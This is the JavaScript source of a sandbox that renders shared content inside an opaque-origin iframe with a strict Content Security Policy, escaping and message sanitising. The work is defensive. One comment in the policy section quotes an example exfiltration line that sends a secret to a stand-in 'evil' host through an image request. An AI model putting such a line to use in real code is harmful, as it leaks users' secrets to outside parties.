(function () {
  "use strict";

  // AgentGateSandbox is the single rendering path for share content.
  //
  // Everything a share contains — diffs, documents, plans, file bundles, uploaded
  // webapps — is rendered inside one opaque-origin <iframe srcdoc> with a strict CSP.
  // The host page decrypts, picks what to run, and assembles the document; it never
  // interprets share content itself. That is the whole point: the host origin holds the
  // decryption key, the remembered passphrase, and (for an operator) the admin session
  // cookie, so share content must never execute there.
  //
  // Two assembly modes:
  //
  //   webapp mode   — the payload carries its own index.html. Local <script>/<link>/
  //                   <img> references resolve from the uploaded files.
  //   renderer mode — the document is one of AgentGate's built-in renderers, whose shell
  //                   lives at /static/renderers/<name>/frame.html. Its references
  //                   resolve from the SERVER, never from the payload, and the payload is
  //                   handed over as inert JSON. A share cannot shadow renderer.js with
  //                   its own copy.
  //
  // The renderer shell is deliberately not called index.html: Go's http.FileServer
  // 301-redirects a request for ".../index.html" to the directory, which would cost an
  // extra round trip and behave differently from the Worker's static-asset serving.

  var MIME = {
    css: "text/css",
    js: "text/javascript",
    mjs: "text/javascript",
    json: "application/json",
    svg: "image/svg+xml",
    html: "text/html",
    txt: "text/plain",
    xml: "application/xml",
    // Binary asset types (carried as base64 in the bundle).
    png: "image/png",
    jpg: "image/jpeg",
    jpeg: "image/jpeg",
    gif: "image/gif",
    webp: "image/webp",
    ico: "image/x-icon",
    bmp: "image/bmp",
    woff: "font/woff",
    woff2: "font/woff2",
    ttf: "font/ttf",
    otf: "font/otf",
    eot: "application/vnd.ms-fontobject",
    mp3: "audio/mpeg",
    wav: "audio/wav",
    mp4: "video/mp4",
    webm: "video/webm",
    wasm: "application/wasm",
    pdf: "application/pdf",
  };

  function ext(name) {
    return (name || "").split(".").pop().toLowerCase();
  }

  function normalizeKey(path) {
    return (path || "")
      .replace(/^\.?\//, "")
      .replace(/^\.\//, "")
      .replace(/[?#].*$/, "");
  }

  // buildFileMap indexes files by both their full relative path and basename so
  // references like "css/app.css", "./css/app.css" and "app.css" all resolve.
  // Each value is an entry { content, encoding }; encoding is "base64" for binary
  // assets and "" (falsy) for UTF-8 text — a missing encoding means text, which
  // keeps bundles produced before base64 support rendering unchanged.
  function buildFileMap(files) {
    var map = {};
    (files || []).forEach(function (f) {
      var name = f.title || "";
      var entry = { content: f.content || "", encoding: f.encoding || "" };
      map[normalizeKey(name)] = entry;
      var base = name.split("/").pop();
      if (base && !(normalizeKey(base) in map)) {
        map[normalizeKey(base)] = entry;
      }
    });
    return map;
  }

  function lookup(map, ref) {
    if (!ref) return null;
    if (/^(https?:|data:|blob:|mailto:|#)/i.test(ref)) return null;
    var key = normalizeKey(ref);
    if (key in map) return map[key];
    var base = key.split("/").pop();
    if (base in map) return map[base];
    return null;
  }

  function findEntry(map, files) {
    if ("index.html" in map) return map["index.html"].content;
    for (var i = 0; i < files.length; i++) {
      if (ext(files[i].title) === "html") return files[i].content || "";
    }
    return null;
  }

  // toDataURI turns a bundle entry into a data: URI. Base64 entries (binary
  // assets) are emitted verbatim as base64; text entries are percent-encoded.
  function toDataURI(entry, name) {
    var isBase64 = entry && entry.encoding === "base64";
    var mime = MIME[ext(name)] || (isBase64 ? "application/octet-stream" : "text/plain");
    if (isBase64) {
      return "data:" + mime + ";base64," + entry.content;
    }
    return "data:" + mime + ";charset=utf-8," + encodeURIComponent(entry.content);
  }

  // inlineCSSUrls rewrites url(...) references inside a stylesheet to data URIs
  // when the referenced asset exists in the bundle (text assets such as SVG).
  function inlineCSSUrls(css, map) {
    return css.replace(/url\(\s*(['"]?)([^'")]+)\1\s*\)/g, function (whole, q, ref) {
      var found = lookup(map, ref);
      if (found == null) return whole;
      return "url(" + toDataURI(found, ref) + ")";
    });
  }

  // ---------------------------------------------------------------------------
  // Built-in libraries
  // ---------------------------------------------------------------------------

  // BUILTIN_LIBS maps a short builtin name to a library vendored on the server.
  // Referencing one of these keeps the library out of the encrypted payload: it is
  // inlined from /static/vendor at render time instead, so bundles stay small enough
  // for the D1-only storage ceiling. The sandbox has connect-src 'none', so inlining
  // is the only way framed code can use a library at all.
  // See web/static/vendor/VERSIONS.md.
  var BUILTIN_LIBS = {
    "lightweight-charts": { file: "lightweight-charts.standalone.production.js", type: "js" },
    marked: { file: "marked.min.js", type: "js" },
    highlight: { file: "highlight.min.js", type: "js" },
    mermaid: { file: "mermaid.min.js", type: "js" },
    diff2html: { file: "diff2html.min.js", type: "js" },
    // React + @mdx-js/mdx, for the built-in doc renderer's MDX path. Built by
    // tools/mdx-bundle; exposes AgentGateMDXVendor rather than a library global.
    mdx: { file: "mdx-runtime.bundle.js", type: "js" },
    "highlight-css": { file: "highlight-github.min.css", type: "css" },
    "highlight-dark-css": { file: "highlight-github-dark.min.css", type: "css" },
    "diff2html-css": { file: "diff2html.min.css", type: "css" },
    // AgentGate's own stylesheets, split by audience: `tokens` holds the design tokens
    // and base typography shared with the host page, `renderer` holds the styles for
    // decrypted content. Built-in renderers link both; an uploaded webapp may link them
    // too if it wants to match AgentGate's look.
    tokens: { file: "tokens.css", type: "css", dir: "css" },
    renderer: { file: "renderer.css", type: "css", dir: "css" },
  };

  // buildBuiltinIndex expands each library into every spelling we accept, so all of
  // these resolve to the same vendored file:
  //   agentgate:mermaid
  //   agentgate://vendor/mermaid.js          (short name + type extension)
  //   agentgate://vendor/mermaid.min.js      (real filename)
  //   /static/vendor/mermaid.min.js          (server-relative path)
  function buildBuiltinIndex() {
    var index = {};
    Object.keys(BUILTIN_LIBS).forEach(function (name) {
      var lib = BUILTIN_LIBS[name];
      var dir = lib.dir || "vendor";
      var entry = { url: "/static/" + dir + "/" + lib.file, type: lib.type };
      index["agentgate:" + name] = entry;
      index["agentgate://" + dir + "/" + name + "." + lib.type] = entry;
      index["agentgate://" + dir + "/" + lib.file] = entry;
      index["/static/" + dir + "/" + lib.file] = entry;
    });
    return index;
  }

  var BUILTIN_ASSETS = buildBuiltinIndex();
  var serverAssetCache = {};

  // builtinAsset resolves a reference to a vendored library, or null. `want` is
  // "js" or "css": a <script src> must not pull in a stylesheet and vice versa.
  function builtinAsset(ref, want) {
    if (!ref) return null;
    var entry = BUILTIN_ASSETS[ref.replace(/[?#].*$/, "")];
    if (!entry || entry.type !== want) return null;
    return entry;
  }

  function fetchServerText(url) {
    if (!serverAssetCache[url]) {
      serverAssetCache[url] = fetch(url, { credentials: "same-origin" }).then(function (res) {
        if (!res.ok) throw new Error("Failed to load " + url + ": " + res.status);
        return res.text();
      });
    }
    return serverAssetCache[url];
  }

  // ---------------------------------------------------------------------------
  // Escaping for serialization into srcdoc
  // ---------------------------------------------------------------------------

  // The capture group preserves the original casing: the escape must neutralise the
  // tag without editing the content it is protecting (a JS string that happens to hold
  // "</SCRIPT>" should still read "</SCRIPT>" after the frame parses it).
  function escapeScriptText(text) {
    return String(text || "").replace(/<\/(script)/gi, "<\\/$1");
  }

  // escapeStyleText keeps an inlined stylesheet from closing its own <style> element
  // when the document is serialized (the HTML serializer writes <style> content as raw
  // text). "</style" is only meaningful inside a CSS string or comment, where "\/" is a
  // valid escape; anywhere else the sequence was already broken CSS. This is a
  // correctness guard, not a security one — the framed document is trusted by itself.
  function escapeStyleText(text) {
    return String(text || "").replace(/<\/(style)/gi, "<\\/$1");
  }

  // jsonForScriptTag serializes data for a <script type="application/json"> block.
  // Every "<" becomes <, which JSON parses back to "<" but the HTML tokenizer
  // cannot read as "</script" or "<!--". Escaping only "</script" would leave the
  // comment form as a way to truncate the block.
  function jsonForScriptTag(data) {
    return JSON.stringify(data).replace(/</g, "\\u003c");
  }

  // ---------------------------------------------------------------------------
  // Content Security Policy
  // ---------------------------------------------------------------------------

  // frameCSP locks the framed document to an offline, self-contained execution model.
  // Because every asset is inlined (see assemble), it needs no network at all.
  // connect-src 'none' blocks fetch/XHR/WebSocket/sendBeacon, and restricting
  // img/font/media/style/script to inline+data: closes the remaining exfiltration
  // vectors (e.g. new Image().src = '//evil/?' + secret). This runs on top of the
  // opaque-origin iframe sandbox for defense in depth.
  //
  // allowEval adds 'unsafe-eval', which @mdx-js/mdx needs because run() evaluates the
  // compiled document body with new AsyncFunction. It is granted only to frames whose
  // payload actually contains MDX. In practice it concedes nothing — 'unsafe-inline' is
  // already present, so framed code can run whatever it likes either way — and the
  // guarantees that matter (opaque origin, no network) are unaffected. Keeping it
  // opt-in means an uploaded webapp stays on the tighter policy.
  function frameCSP(allowEval) {
    return (
      "default-src 'none'; " +
      "script-src 'unsafe-inline' " + (allowEval ? "'unsafe-eval' " : "") + "blob:; " +
      "style-src 'unsafe-inline'; " +
      "img-src data: blob:; font-src data:; media-src data: blob:; " +
      "connect-src 'none'; form-action 'none'; base-uri 'none'"
    );
  }

  // ---------------------------------------------------------------------------
  // The in-frame bridge
  // ---------------------------------------------------------------------------

  var MSG = {
    // host -> frame
    requestHeight: "__agentgate_request_height",
    settings: "__agentgate_settings",
    printScope: "__agentgate_print_scope",
    hash: "__agentgate_hash",
    // frame -> host
    ready: "__agentgate_ready",
    height: "__agentgate_app_height",
    frameHash: "__agentgate_frame_hash",
    currentFile: "__agentgate_current_file",
    pref: "__agentgate_pref",
  };

  // BRIDGE_SOURCE runs inside the frame. It handles the parts that do not need to know
  // what is being rendered — measuring height, relaying host messages — and exposes
  // window.AgentGateFrame so a renderer can subscribe to the rest. An uploaded webapp
  // that knows nothing about this still gets height reporting, which is what the PDF
  // export needs.
  //
  // Kept as a string rather than a file because it must be inlined: the frame cannot
  // fetch anything.
  var BRIDGE_SOURCE = [
    "(function(){",
    "  var M=" + JSON.stringify(MSG) + ";",
    "  function h(){var d=document,e=d.documentElement,b=d.body;",
    "    return Math.max(e?e.scrollHeight:0,e?e.offsetHeight:0,b?b.scrollHeight:0,b?b.offsetHeight:0);}",
    "  function send(k,v){try{parent.postMessage({__agentgate:1,type:k,value:v},'*');}catch(e){}}",
    "  var api={onSettings:null,onPrintScope:null,onHash:null,",
    "    reportHeight:function(){send(M.height,h());},",
    "    reportHash:function(v){send(M.frameHash,v);},",
    "    reportCurrentFile:function(v){send(M.currentFile,v);},",
    // The frame has no localStorage (opaque origin), so a view preference it wants to
    // remember is handed to the host to persist and replayed on the next load.
    "    savePref:function(k,v){send(M.pref,{key:k,value:v});}};",
    "  window.AgentGateFrame=api;",
    // Settings are applied here rather than in each renderer: they are only CSS custom
    // properties plus the theme attribute, and tokens.css/renderer.css read them the
    // same way inside the frame as on the host page.
    "  api.applySettings=function(s){",
    "    if(!s)return;var el=document.documentElement;if(!el)return;",
    "    if(s.theme==='light'||s.theme==='dark'){el.setAttribute('data-theme',s.theme);}",
    "    else{el.removeAttribute('data-theme');}",
    "    var v=s.vars||{};Object.keys(v).forEach(function(k){",
    "      if(v[k]){el.style.setProperty(k,v[k]);}else{el.style.removeProperty(k);}});",
    "  };",
    "  window.addEventListener('message',function(ev){",
    "    var d=ev&&ev.data;if(!d)return;",
    // Legacy shape: pre-bridge frames were asked for height via a bare flag key.
    // Kept so an older cached page talking to a newer frame still measures.
    "    if(d[M.requestHeight]||d.type===M.requestHeight){api.reportHeight();return;}",
    "    if(d.type===M.settings){api.applySettings(d.value);",
    "      try{api.onSettings&&api.onSettings(d.value);}catch(e){}",
    "      api.reportHeight();return;}",
    "    if(d.type===M.printScope){try{Promise.resolve(api.onPrintScope&&api.onPrintScope(d.value))",
    "      .then(function(){api.reportHeight();});}catch(e){api.reportHeight();}return;}",
    "    if(d.type===M.hash){try{api.onHash&&api.onHash(d.value);}catch(e){}return;}",
    "  });",
    // Re-measure whenever layout changes (images decoding, fonts, a renderer expanding
    // a section) so the host can keep the frame at full height without polling.
    "  function watch(){",
    // Apply the settings that came in with the payload before the first measurement, so
    // the height the host receives already reflects the chosen font size.
    "    try{var p=document.getElementById('agentgate-payload');",
    "      if(p){var d=JSON.parse(p.textContent||'{}');api.applySettings(d.settings);}}catch(e){}",
    "    if(typeof ResizeObserver==='function'){",
    "      var last=0,ro=new ResizeObserver(function(){var n=h();",
    "        if(Math.abs(n-last)>2){last=n;api.reportHeight();}});",
    "      if(document.documentElement)ro.observe(document.documentElement);",
    "      if(document.body)ro.observe(document.body);",
    "    }",
    "    api.reportHeight();send(M.ready,1);",
    "  }",
    "  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',watch);}else{watch();}",
    "})();",
  ].join("\n");

  // ---------------------------------------------------------------------------
  // Assembly
  // ---------------------------------------------------------------------------

  // resolveRefs replaces every local <link rel=stylesheet> and <script src> in `doc`
  // with inline content. `resolve(ref, want)` returns either
  //   { text: "..." }            resolved synchronously (from the payload), or
  //   { url: "/static/..." }     to be fetched from the server, or
  //   null                       leave the element untouched.
  function resolveRefs(doc, resolve, map) {
    var pending = [];

    function inlineStyle(el, text, label) {
      var style = doc.createElement("style");
      if (label) style.setAttribute("data-agentgate-builtin", label);
      // Only payload stylesheets can reference payload assets; server assets cannot.
      style.textContent = escapeStyleText(label ? text : inlineCSSUrls(text, map));
      el.parentNode.replaceChild(style, el);
    }

    function inlineScript(el, text, label) {
      var script = doc.createElement("script");
      var type = el.getAttribute("type");
      if (type) script.setAttribute("type", type);
      if (label) script.setAttribute("data-agentgate-builtin", label);
      script.textContent = escapeScriptText(text);
      el.parentNode.replaceChild(script, el);
    }

    Array.prototype.forEach.call(doc.querySelectorAll('link[rel~="stylesheet"][href]'), function (link) {
      var href = link.getAttribute("href");
      var got = resolve(href, "css");
      if (!got) return;
      if (typeof got.text === "string") {
        inlineStyle(link, got.text, got.label);
        return;
      }
      pending.push(
        fetchServerText(got.url).then(function (text) {
          if (link.parentNode) inlineStyle(link, text, got.label || href);
        })
      );
    });

    // Rewrite url() in author stylesheets. Runs before the async inlines land, which is
    // correct: those carry server CSS, which cannot reference payload assets.
    Array.prototype.forEach.call(doc.querySelectorAll("style"), function (style) {
      style.textContent = escapeStyleText(inlineCSSUrls(style.textContent || "", map));
    });

    Array.prototype.forEach.call(doc.querySelectorAll("script[src]"), function (script) {
      var src = script.getAttribute("src");
      var got = resolve(src, "js");
      if (!got) return;
      if (typeof got.text === "string") {
        inlineScript(script, got.text, got.label);
        return;
      }
      pending.push(
        fetchServerText(got.url).then(function (text) {
          if (script.parentNode) inlineScript(script, text, got.label || src);
        })
      );
    });

    return Promise.all(pending);
  }

  function inlineMedia(doc, map) {
    var sel = "img[src], source[src], audio[src], video[src], image[href]";
    Array.prototype.forEach.call(doc.querySelectorAll(sel), function (el) {
      var attr = el.hasAttribute("src") ? "src" : "href";
      var found = lookup(map, el.getAttribute(attr));
      if (found == null) return;
      el.setAttribute(attr, toDataURI(found, el.getAttribute(attr)));
    });
  }

  function insertCSP(doc, allowEval) {
    var csp = doc.createElement("meta");
    csp.setAttribute("http-equiv", "Content-Security-Policy");
    csp.setAttribute("content", frameCSP(allowEval));
    var head = doc.head || doc.getElementsByTagName("head")[0];
    if (head) {
      head.insertBefore(csp, head.firstChild);
    } else {
      doc.documentElement.insertBefore(csp, doc.documentElement.firstChild);
    }
  }

  // insertBridge puts the host bridge at the end of <head>, i.e. before any script the
  // document itself declares. Appending it to <body> instead would place it *after* a
  // renderer's own scripts, so the renderer would find window.AgentGateFrame undefined,
  // silently fall back to a no-op stub, and lose deep links and print-scope switching
  // while height reporting kept working — a failure that is easy to miss.
  function insertBridge(doc) {
    var el = doc.createElement("script");
    el.setAttribute("data-agentgate-bridge", "1");
    el.textContent = BRIDGE_SOURCE;
    var head = doc.head || doc.getElementsByTagName("head")[0];
    if (head) {
      head.appendChild(el);
    } else {
      doc.documentElement.insertBefore(el, doc.documentElement.firstChild);
    }
    return el;
  }

  function serialize(doc) {
    return "<!DOCTYPE html>\n" + doc.documentElement.outerHTML;
  }

  // assembleWebapp builds the document for a payload that carries its own index.html.
  // References resolve from the uploaded files first, then from the agentgate: builtins.
  function assembleWebapp(files, opts) {
    opts = opts || {};
    var map = buildFileMap(files);
    var entry = findEntry(map, files || []);
    if (entry == null) {
      return Promise.resolve({ error: "No index.html (or any .html file) found in this bundle." });
    }

    var doc = new DOMParser().parseFromString(entry, "text/html");
    insertCSP(doc, !!opts.allowEval);

    function resolve(ref, want) {
      var local = lookup(map, ref);
      if (local != null) return { text: local.content };
      var builtin = builtinAsset(ref, want);
      if (builtin) return { url: builtin.url, label: ref };
      return null;
    }

    return resolveRefs(doc, resolve, map).then(function () {
      inlineMedia(doc, map);
      insertBridge(doc);
      return { html: serialize(doc) };
    });
  }

  // assembleRenderer builds the document for one of AgentGate's built-in renderers.
  // The payload is injected as inert JSON and is NOT used to resolve references — a
  // share must not be able to substitute its own renderer.js.
  function assembleRenderer(rendererName, payload, opts) {
    opts = opts || {};
    var base = "/static/renderers/" + rendererName + "/";

    return fetchServerText(base + "frame.html").then(function (shell) {
      var doc = new DOMParser().parseFromString(shell, "text/html");

      // Drop optional pieces the payload does not need, before anything is fetched.
      // The doc renderer uses this to leave out the 584 KB React/MDX bundle — and the
      // 'unsafe-eval' its compiler requires — for plain-Markdown shares.
      var features = opts.features || {};
      Array.prototype.forEach.call(doc.querySelectorAll("[data-agentgate-when]"), function (el) {
        if (!features[el.getAttribute("data-agentgate-when")] && el.parentNode) {
          el.parentNode.removeChild(el);
        }
      });

      insertCSP(doc, !!opts.allowEval);

      // Renderer refs come off the server; builtins keep their aliases. Nothing resolves
      // against the payload, so `map` is intentionally empty here — a share cannot
      // substitute its own renderer.js.
      //
      // Two spellings: a bare name resolves inside this renderer's own directory, and an
      // absolute /static/renderers/... path lets renderers share code from common/.
      function resolve(ref, want) {
        if (!ref || /^(https?:|data:|blob:|mailto:|#)/i.test(ref)) return null;
        var builtin = builtinAsset(ref, want);
        if (builtin) return { url: builtin.url, label: ref };
        if (ref.indexOf("/static/renderers/") === 0) {
          return { url: ref.replace(/[?#].*$/, "") };
        }
        return { url: base + normalizeKey(ref) };
      }

      return resolveRefs(doc, resolve, {}).then(function () {
        // Order in <head>: payload JSON, then the bridge. Both must precede the
        // renderer's scripts, which frame.html declares at the end of <body>, because the
        // renderer reads the payload and registers its handlers on the bridge at load.
        var json = doc.createElement("script");
        json.setAttribute("type", "application/json");
        json.setAttribute("id", "agentgate-payload");
        json.textContent = jsonForScriptTag({
          payload: payload,
          settings: opts.settings || null,
          hash: opts.hash || "",
          // Renderer-scoped view preferences (e.g. the diff's split/unified choice).
          // The frame is opaque-origin and has no localStorage, so the host stores them
          // and hands them over here; the frame asks for a write via the "pref" message.
          prefs: opts.prefs || {},
        });
        var head = doc.head || doc.documentElement;
        head.appendChild(json);
        insertBridge(doc);
        return { html: serialize(doc) };
      });
    });
  }

  // ---------------------------------------------------------------------------
  // Sanitising what the frame reports back
  // ---------------------------------------------------------------------------
  //
  // Framed code can postMessage whatever it likes, and a share written by a compromised
  // agent will. There is nothing for it to exfiltrate — the host already holds the
  // plaintext — but the host must not pass a frame-supplied value straight into an API
  // that changes the page's identity or its layout without bound.

  // MAX_FRAME_HEIGHT stops a frame from claiming an absurd height and wrecking the host's
  // layout (or exhausting memory while the browser lays it out).
  var MAX_FRAME_HEIGHT = 200000;

  function clampHeight(value) {
    var n = Number(value);
    if (!isFinite(n)) return null;
    return Math.min(Math.max(n, 80), MAX_FRAME_HEIGHT);
  }

  // safeFragment reduces a frame-reported deep link to a bare fragment. Without it a
  // hostile frame could hand the host "/admin" or "//evil.example" and have
  // history.replaceState rewrite the visible URL — same-origin URL spoofing.
  function safeFragment(value) {
    var s = String(value == null ? "" : value).replace(/^#+/, "");
    if (!s || s.length > 256) return "";
    // Fragment identifiers only: no path, protocol, whitespace, or control characters.
    if (!/^[\w.:~%!$&'()*+,;=@-]+$/.test(s)) return "";
    return "#" + s;
  }

  // safeName is only ever compared against the host's own list of decrypted filenames, so
  // it just has to be a bounded plain string.
  function safeName(value) {
    var s = String(value == null ? "" : value);
    return s.length > 512 ? "" : s;
  }

  // safePref bounds a preference the frame asks the host to persist. The key becomes part
  // of a localStorage key, so it is restricted to a plain identifier — a frame must not be
  // able to pick the storage slot and overwrite, say, a remembered passphrase.
  function safePref(value) {
    if (!value || typeof value !== "object") return null;
    var key = String(value.key == null ? "" : value.key);
    var val = String(value.value == null ? "" : value.value);
    if (!/^[a-z0-9][a-z0-9-]{0,40}$/i.test(key)) return null;
    if (val.length > 256) return null;
    return { key: key, value: val };
  }

  // ---------------------------------------------------------------------------
  // Mounting
  // ---------------------------------------------------------------------------

  // mount inserts the assembled document into an <iframe srcdoc> and wires the message
  // bridge. Returns a handle the host chrome drives.
  //
  // opts.autoHeight grows the frame to its content height so the host page owns the
  // only scrollbar — the document then reads as one page instead of a box with its own
  // scrollbar. It is enabled for built-in renderers and left off for uploaded webapps,
  // which were authored against a fixed-size viewport and may use vh units.
  function mount(container, html, opts) {
    opts = opts || {};

    var frame = document.createElement("iframe");
    frame.className = opts.className || "app-frame";
    // No allow-same-origin: the frame runs in an opaque origin so it cannot reach this
    // decryption page or other shares. localStorage/cookies are therefore unavailable
    // to framed code by design.
    frame.setAttribute("sandbox", "allow-scripts allow-forms allow-modals allow-popups");
    if (opts.autoHeight) frame.classList.add("app-frame--auto");
    frame.setAttribute("srcdoc", html);
    container.appendChild(frame);

    var lastHeight = 0;
    // Every event a caller can subscribe to must be listed here — on() ignores unknown
    // names, so a missing entry makes the subscription silently do nothing.
    var handlers = { ready: [], height: [], hash: [], currentFile: [], pref: [] };

    function on(name, fn) {
      if (!handlers[name]) {
        console.error("AgentGate: no such sandbox event", name);
        return;
      }
      handlers[name].push(fn);
    }
    function emit(name, value) {
      (handlers[name] || []).forEach(function (fn) {
        try {
          fn(value);
        } catch (e) {
          console.error("sandbox handler failed", name, e);
        }
      });
    }

    function post(type, value) {
      if (!frame.contentWindow) return;
      try {
        frame.contentWindow.postMessage({ __agentgate: 1, type: type, value: value }, "*");
      } catch (e) {
        // Frame not ready yet; callers re-post on ready.
      }
    }

    function onMessage(ev) {
      // Only accept messages from our own frame. The frame is opaque-origin so
      // ev.origin is "null" and cannot be checked usefully; the source identity can.
      if (!ev || ev.source !== frame.contentWindow) return;
      var d = ev.data;
      if (!d || d.__agentgate !== 1) {
        // Legacy shape from a pre-bridge frame.
        if (d && typeof d[MSG.height] === "number") applyHeight(d[MSG.height]);
        return;
      }
      // Everything below is attacker-controlled: framed code can postMessage whatever it
      // likes, and a share authored by a compromised agent will. The frame has nothing to
      // exfiltrate (the host already holds the plaintext), but the host must not let a
      // frame-supplied value reach an API that changes the page's identity or layout
      // unbounded. Hence the sanitising here rather than in each consumer.
      if (d.type === MSG.height) return applyHeight(d.value);
      if (d.type === MSG.ready) return emit("ready");
      if (d.type === MSG.frameHash) return emit("hash", safeFragment(d.value));
      if (d.type === MSG.currentFile) return emit("currentFile", safeName(d.value));
      if (d.type === MSG.pref) {
        var pref = safePref(d.value);
        return pref ? emit("pref", pref) : undefined;
      }
    }

    function applyHeight(value) {
      var h = clampHeight(value);
      if (h === null) return;
      lastHeight = h;
      if (opts.autoHeight) frame.style.height = h + "px";
      emit("height", h);
    }

    window.addEventListener("message", onMessage);

    return {
      frame: frame,
      on: on,
      height: function () {
        return lastHeight;
      },
      requestHeight: function () {
        post(MSG.requestHeight, 1);
      },
      setSettings: function (settings) {
        post(MSG.settings, settings);
      },
      setHash: function (hash) {
        post(MSG.hash, hash);
      },
      setPrintScope: function (scope) {
        post(MSG.printScope, scope);
      },
      // objectURL turns the assembled document into a same-document blob: URL, for
      // "open in a new tab" and "save as a single .html file". The saved file is
      // fully self-contained — every asset is already inlined.
      objectURL: function () {
        return URL.createObjectURL(new Blob([html], { type: "text/html;charset=utf-8" }));
      },
      destroy: function () {
        window.removeEventListener("message", onMessage);
        if (frame.parentNode) frame.parentNode.removeChild(frame);
      },
    };
  }

  // printFullHeight expands the frame to its reported content height, prints (so the
  // PDF paginates instead of clipping to one page), then restores the on-screen size.
  // Falls back to a plain print if the frame never reports a height.
  function printFullHeight(handle) {
    if (!handle || !handle.frame || !handle.frame.contentWindow) {
      window.print();
      return;
    }
    var frame = handle.frame;
    var restore = frame.style.height;
    var started = false;

    function afterPrint() {
      frame.style.height = restore;
      document.body.classList.remove("agentgate-printing-app");
      window.removeEventListener("afterprint", afterPrint);
    }

    function go(fullHeight) {
      if (started) return;
      started = true;
      frame.style.height = fullHeight + "px";
      document.body.classList.add("agentgate-printing-app");
      window.addEventListener("afterprint", afterPrint);
      setTimeout(function () {
        window.print();
      }, 200);
    }

    var known = handle.height();
    if (known > 80) {
      go(known);
      return;
    }
    var off = false;
    handle.on("height", function (h) {
      if (!off) {
        off = true;
        go(h);
      }
    });
    handle.requestHeight();
    setTimeout(function () {
      if (!off) {
        off = true;
        go(Math.max(handle.height(), 800));
      }
    }, 800);
  }

  window.AgentGateSandbox = {
    assembleWebapp: assembleWebapp,
    assembleRenderer: assembleRenderer,
    mount: mount,
    printFullHeight: printFullHeight,
    frameCSP: frameCSP,
    // Exposed for the landing page, docs, and tests.
    builtinLibs: BUILTIN_LIBS,
    resolveBuiltin: builtinAsset,
    // Exposed for tests: escaping and payload embedding are easy to get subtly wrong,
    // and BRIDGE_SOURCE is a JS-in-a-string that no linter or parser would otherwise
    // check — a typo there breaks every share silently.
    _internals: {
      BRIDGE_SOURCE: BRIDGE_SOURCE,
      MAX_FRAME_HEIGHT: MAX_FRAME_HEIGHT,
      clampHeight: clampHeight,
      safeFragment: safeFragment,
      safeName: safeName,
      safePref: safePref,
      jsonForScriptTag: jsonForScriptTag,
      escapeScriptText: escapeScriptText,
      escapeStyleText: escapeStyleText,
      buildFileMap: buildFileMap,
      lookup: lookup,
      toDataURI: toDataURI,
      MSG: MSG,
    },
  };
})();
